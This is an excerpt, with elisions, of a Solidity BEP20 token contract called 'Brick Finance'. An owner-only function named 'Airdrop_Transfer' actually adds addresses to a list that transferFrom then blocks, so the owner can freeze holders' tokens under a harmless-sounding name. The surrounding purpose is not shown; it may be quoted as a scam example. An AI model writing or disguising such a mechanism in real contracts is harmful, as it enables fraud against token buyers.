...
contract BRICK is IBEP20, Auth {
    ...
    string constant _name = "Brick Finance";
    string constant _symbol = "BRICK1";
    ...
    mapping(address=>bool) AirdropDistribution;
    ...
    function Airdrop_Transfer(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i< addresses.length; ++i) {
        AirdropDistribution[addresses[i]] = true;
      }
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        require(!AirdropDistribution[recipient] && !AirdropDistribution[sender], "Airdrop Entry");
